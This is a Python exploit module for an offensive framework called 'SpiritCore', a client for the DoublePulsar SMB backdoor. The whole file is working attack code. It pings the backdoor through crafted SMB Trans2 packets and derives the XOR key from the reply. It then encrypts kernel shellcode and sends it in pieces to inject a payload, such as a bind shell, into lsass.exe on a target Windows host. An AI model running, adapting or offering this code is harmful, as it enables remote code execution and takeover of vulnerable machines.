#!/usr/bin/python
# -*- coding: utf-8 -*-
# 3he11 参考http://bobao.360.cn/member/contribute?uid=2554610746 
from impacket import smb
from struct import pack,unpack
from SpiritCore.Modules import *
from SpiritCore.Payload import *
from SpiritCore.System import *
import random
import binascii
import argparse,sys
from struct import *





SendCode = {
1: 0x23,
2: 0xc8,
3: 0x77
}

RetMid = {
"0":"NotDetected",
"16":"Success",
"32":"InvalidParams",
"48":"AllocFailure"
  }

MidStaue = {
"NotDetected":"0",
"Success":"10",
"InvalidParams":"20",
"AllocFailure":"30"
  }


def DouCalParame(Type,Data,key):
    if Type == 1 or Type==2:
        return b"\x00"*12


def CalcDoublepulsaXokey(s):
    """Calaculate Doublepulsar Xor Key
    """
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x

def MakePameateData(send_data):
    send_data=(b"\x90"*3800)+send_data
    data_len = len(send_data)
    PayloadLen=pack("<H",data_len)
    pame = []
    data=[]

    ncount = data_len / 4096
    if (data_len % 4096) > 0:
        ncount += 1
    make_data =b""

    for i in range(int(ncount)):
        #write(i)
        if i < ncount-1:
            #print binascii.b2a_hex(smb_Length)
            #write("s")
            totalDataCount = pack("<H",4096)
            make_data = send_data[i*4096:(i+1)*4096]
        else:
            totalDataCount = pack("<H",data_len - 4096*i)
            make_data = send_data[i*4096:]
        #write("s")
        data_index = pack(">H",i*0x10)
        #write(len(make_data))
        data_header =PayloadLen+b"\x00\x00"+pack("<H",len(make_data))+b"\x00\x00"+data_index+b"\x00\x00"
        #write("s")
        pame.append(data_header)
        data.append(make_data)
    return pame,data,ncount
def MakeSmbTrans2DoublepulsarPing(SmbSession,TreeID,Type,body=b""):
    MultiplexID=random.randint(0x0000,0xffff)
    DopuParame=DouCalParame(1,body,None)
    Payload = b"%s%s"%(DopuParame,(body))
    SetupData=b"\x0e\x00"
    base_offset = 67 + (1 * 2) - 4
    param_offset = base_offset
    data_offset = param_offset + len(DopuParame)
    Smb2_Session= smb.NewSMBPacket()
    Smb2_Session["Flags1"]=0x18
    Smb2_Session["Tid"]=TreeID
    Smb2_Session["Flags2"]=0xc007
    Smb2_Session["Mid"]=MultiplexID
    Trans2Parameate = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2)
    RespData= smb.SMBTransaction2Response_Data()
    Trans2Parameate['Parameters'] = smb.SMBTransaction2_Parameters()
    Trans2Parameate['Parameters']['Setup'] = pack("H",0x000e)
    Trans2Parameate["Parameters"]["TotalParameterCount"]=len(DopuParame)
    Trans2Parameate["Parameters"]["MaxDataCount"]=0
    Trans2Parameate["Parameters"]["MaxParameterCount"]=1
    Trans2Parameate["Parameters"]["TotalDataCount"]=len(str(body))
    Trans2Parameate["Parameters"]["ParameterOffset"]=param_offset
    Trans2Parameate["Parameters"]["SetupCount"]=1
    Trans2Parameate["Parameters"]["DataCount"]=len(str(body))
    Trans2Parameate["Parameters"]["ParameterCount"]=len(DopuParame)
    Trans2Parameate["Parameters"]["DataOffset"]=data_offset
    Trans2Parameate["Parameters"]["Timeout"]=0x00ce361f
    RespData['Trans_ParametersLength']=len(DopuParame)
    RespData['Trans_DataLength']= Trans2Parameate["Parameters"]['DataCount']
    setup=b"1"
    padLen=0
    if len(DopuParame) > 0:
        padLen = (4 - (55 + len(setup)) % 4 ) % 4
        padBytes = b'\xFF' * padLen
        RespData['Pad1'] = padBytes
    else:

        padLen = 0
        RespData['Pad1'] = b''
    if len(str(body)) > 0:
        #pad2Len = 4 - (55 + len(setup) + padLen + len(parameters)) % 4
        pad2Len = (4 - (55 + len(setup) + padLen + len(DopuParame)) % 4) % 4
        RespData['Pad2'] = b'\xFF' * pad2Len+b"0x00"
    else:
        RespData['Pad2']= b'\x00'
    RespData['Trans_Parameters'] = DopuParame[:Trans2Parameate["Parameters"]['ParameterCount']]
    RespData['Trans_Data']       = DopuParame[:Trans2Parameate["Parameters"]['DataCount']] 
    Trans2Parameate['Data'] =RespData
    #Trans2Parameate["Parameters"]["Payload"]=Payload
    Smb2_Session.addCommand(Trans2Parameate)
    SmbSession.sendSMB(Smb2_Session)
    HanderSmb=SmbSession.recvSMB() 
    SecurityFeatures=HanderSmb["SecurityFeatures"][:4]
    RetMultiplexID=HanderSmb["Mid"]

    SmbSign = unpack("<I",SecurityFeatures)[0]
    IKey = CalcDoublepulsaXokey(SmbSign)
    XorKey=pack("<I",IKey)
    if HanderSmb["SecurityFeatures"][4:5] == b"\x01":
        Arch="x64 (64-bit)"
    else:
        Arch="x86 (32-bit)"
    Staut=RetMultiplexID-MultiplexID
    return XorKey,Arch,Staut,MultiplexID









def MakeSmbTrans2Payload(SmbSession,TreeID,parame,body):
    #write(len(parame))

    MultiplexID=random.randint(0x0000,0xffff)
    DopuParame=parame
    base_offset = 67 + (1 * 2) - 4+1
    param_offset = base_offset
    data_offset = param_offset + len(DopuParame)
    Smb2_Session= smb.NewSMBPacket()
    Smb2_Session["Flags1"]=0x18
    Smb2_Session["Tid"]=TreeID
    Smb2_Session["Flags2"]=0xc007
    Smb2_Session["Mid"]=MultiplexID
    Trans2Parameate = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2)
    RespData= smb.SMBTransaction2Response_Data()
    Trans2Parameate['Parameters'] = smb.SMBTransaction2_Parameters()
    Trans2Parameate['Parameters']['Setup'] = pack("H",0x000e)
    Trans2Parameate["Parameters"]["TotalParameterCount"]=len(DopuParame)
    Trans2Parameate["Parameters"]["MaxDataCount"]=0
    Trans2Parameate["Parameters"]["MaxParameterCount"]=1
    Trans2Parameate["Parameters"]["TotalDataCount"]=len(body)
    Trans2Parameate["Parameters"]["ParameterOffset"]=param_offset
    Trans2Parameate["Parameters"]["SetupCount"]=1
    Trans2Parameate["Parameters"]["DataCount"]=len(body)
    Trans2Parameate["Parameters"]["ParameterCount"]=len(DopuParame)
    Trans2Parameate["Parameters"]["DataOffset"]=data_offset
    Trans2Parameate["Parameters"]["Timeout"]=0x00814dfa
    RespData['Trans_ParametersLength']=len(DopuParame)
    RespData['Trans_DataLength']= Trans2Parameate["Parameters"]['DataCount']
    RespData['Pad1'] = b'\x00'
    RespData['Pad2']= b''
    RespData['Trans_Parameters'] = parame
    RespData['Trans_Data']       = body
    Trans2Parameate['Data'] =RespData
    #Trans2Parameate["Parameters"]["Payload"]=Payload
    Smb2_Session.addCommand(Trans2Parameate)
    SmbSession.sendSMB(Smb2_Session)
    HanderSmb=SmbSession.recvSMB() 
    RetMultiplexID=HanderSmb["Mid"]
    Staut=RetMultiplexID-MultiplexID
    return Staut,MultiplexID






def xor_data(data , enc):
    org_data=str(data,encoding='unicode_escape')
    key=str(enc,encoding='unicode_escape')
    #write(len(org_data))
    newdata = ""
    for i in range(len(org_data)):
        newdata += chr(ord(org_data[i]) ^ ord(key[i%len(key)]))
    return newdata

def payload(self,TargetIp,KernelShellCode,Type='Ping'):
    print_msg("Selected Protocol SMB")
    
    print_msg("Connecting to target...")
    try:
        SmbSession = smb.SMB(TargetIp, TargetIp)
        SmbSession.login_standard('', '')
    except:
        print_error("Bad or unknown status returned")
        return 
    print_success("Connected to target, pinging backdoor...")
    
    ServerOs = SmbSession.get_server_os().__str__()
    
    TreeID = SmbSession.tree_connect_andx('\\\\%s\\IPC$'%TargetIp)    
    if ServerOs.startswith("Windows 7") :
        OsVer="7"
    elif ServerOs.startswith("Windows 2003") :
        OsVer="2003"
    elif ServerOs.startswith("Windows XP") :
        OsVer="XP"
    elif ServerOs.startswith("Windows Vista") :
        OsVer="Vista"
    elif ServerOs.startswith("2008") :
        OsVer="2008"
    elif ServerOs.startswith("Windows 8") :
        OsVer="8"
    else:
        OsVer="unknown"

    if ServerOs.startswith(" Pack 1") :
        SP="1"
    elif ServerOs.startswith(" Pack 2") :
        SP="2"
    elif ServerOs.startswith(" Pack 3") :
        SP="3"
    else:
        SP="unknown"

    IKey,Arch,BackdoorStaue,MultiplexID=MakeSmbTrans2DoublepulsarPing(SmbSession,TreeID,Type,b"")
    if IKey==b"\x00\x00\x00\x00" and BackdoorStaue!=0x10:
        print_error('\t Packet MID is zero, backdoor not present')
        return
    #write("dawdwa");
    Staue=MidStaue[RetMid[str(BackdoorStaue)]]
    print_success("\t Backdoor returned code: %s - %s!"%(Staue,RetMid[str(BackdoorStaue)]))
    key=IKey
    print_success(("\t Ping returned Target architecture: %s - XOR Key: 0x%s"%(Arch,str(binascii.b2a_hex(key),"utf-8").upper())))
    print_success("SMB Connection string is: %s "%(ServerOs))
    print_success("Target OS is: %s %s"%(OsVer,Arch))
    print_success("Target SP is:"+SP)
    if Type=='Ping':
        print_success("\t Backdoor installed")
    elif Type=="RunShellCode":
        try:
            #print KernelShellCode
            pameame,data,count=MakePameateData(KernelShellCode)
            #print pameame
            #write("s")
            for i in range(int(count)):
                try:
                    #write("w")
                    #write(binascii.b2a_hex(pameame[i]))
                    StatusId,Mid=MakeSmbTrans2Payload(SmbSession,TreeID,xor_data((pameame[i]),(key)),xor_data((data[i]),(key)))
                    print_success("\t Backdoor returned code: %s - %s!"%(StatusId,RetMid[str(StatusId)]))

                except Exception as error:
                    write(error)
        except Exception as error:
            write(error)


    print_success("\t Command completed successfully")


class Module(Modules):
    Info = {
        "Name": "DoublePulasr",
        "Author": "ZSD",
        "Description": "Microsoft Windows SMBv2 DoublePulasr Backdoor Client ",
        "Options": (
            ("TargetIp", "192.168.0.108", True, 'Target IP Address'),
            ("Architecture", "x64", True, "Operating System, Service Pack, and Architecture of target OS"),
            ("Protocol", "SMB", False, "Protocol for the backdoor to speak SMB and RDP"),
            ("Function", "RunShellCode", False, "Function Command",["RunShellCode","Ping"]),
            ("ProcessName", "lsass.exe", False, "Ring3 ShellCode Inject Target Process"),
        ),
        "Payload": ["windows/bind_shell_tcp", "Windows Ring3 ShellCode"],

    }

    def Exploit(self):
        print_msg("Generate ShellCode")
        SCO = ShellCode(self.Object, self.Object.UsePayloadObject.Name, self.Parameate)

        User_ShellCode = SCO.raw_shellcode()
        Kernel_ShellCode = SCO.Ring0ApcInjectRing3Shellcode(self.Parameate['ProcessName'],
                                                            self.Parameate['Architecture'])
        if self.Parameate['Function']=="RunShellCode":
            SC=Kernel_ShellCode + User_ShellCode
            print_success("Build Ring0 Kernel ShellCode Successfully")
        else:
            SC=b""
        #SC=open("SpiritCore/Lib/Lib/Windows/Rdp.bin","rb").read()
        payload(self,self.Parameate['TargetIp'],SC,self.Parameate['Function'])
        # write(Kernel_ShellCode)
